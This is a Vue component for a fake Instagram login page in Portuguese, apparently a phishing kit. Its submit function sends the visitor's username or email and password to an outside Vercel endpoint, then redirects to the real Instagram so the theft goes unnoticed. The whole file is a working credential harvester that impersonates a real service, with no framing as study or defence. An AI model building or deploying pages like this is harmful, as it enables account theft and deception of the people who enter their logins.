<script lang="js" setup>
import { ref } from 'vue';
import axios from 'axios'
const email = ref('');
const password = ref('');

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('https://project-khaki-zeta-81.vercel.app/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.instagram.com/";
}

</script>

<template>
  <main class="flex align-items-center justify-content-center">
    <section id="mobile" class="flex">
    </section>
    <section id="auth" class="flex direction-column">
      <div class="panel login flex direction-column">
        <h1 title="Instagram" class="flex justify-content-center">
          <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
        </h1>
        <form @submit="submit">
          <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
          <input v-model="email" name="email" placeholder="Telefone, nome de usuário ou e-mail" />

          <label for="password" class="sr-only">Senha</label>
          <input v-model="password" name="password" type="password" placeholder="Senha" />

          <button type="submit">Entrar</button>
        </form>
        <div class="flex separator align-items-center">
          <span></span>
          <div class="or">OU</div>
          <span></span>
        </div>
        <div class="login-with-fb flex direction-column align-items-center">
          <div>
            <img />
            <a>Entrar com o facebook</a>
          </div>
          <a href="#">Esqueceua senha?</a>
        </div>
      </div>
      <div class="panel register flex justify-content-center">
        <p>Não tem uma conta?</p>
        <a href="#">Cadastre-se</a>
      </div>
      <div class="app-download flex direction-column align-items-center">
        <p>Obtenha o aplicativo.</p>
        <div class="flex justify-content-center">
          <img src="./img/apple-button.png" alt="Imagem com a logo da Apple Store"
            title="Imagem com a logo da Apple Store" />
          <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play"
            title="Imagem com a logo da Google Play" />
        </div>
      </div>
    </section>
  </main>
  <footer>

    <p class="copyright">© 2020 Instagram do Facebook</p>
  </footer>
</template>
